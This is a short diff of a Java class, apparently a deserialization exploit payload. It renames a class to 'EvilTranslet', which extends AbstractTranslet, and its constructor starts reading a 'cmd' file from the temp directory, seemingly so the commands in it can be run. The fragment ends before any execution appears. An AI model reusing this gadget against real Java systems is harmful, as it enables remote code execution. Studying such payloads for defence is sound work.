@@ -10,12 +10,9 @@ import java.io.InputStreamReader;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 
-/**
- * @author threedr3am
- */
-public class Threedr3am_11 extends AbstractTranslet {
+public class EvilTranslet extends AbstractTranslet {
 
-  public Threedr3am_11() {
+  public EvilTranslet() {
     try {
       String tmp = System.getProperty("java.io.tmpdir");
       String inputFile = tmp + File.separator + "cmd";
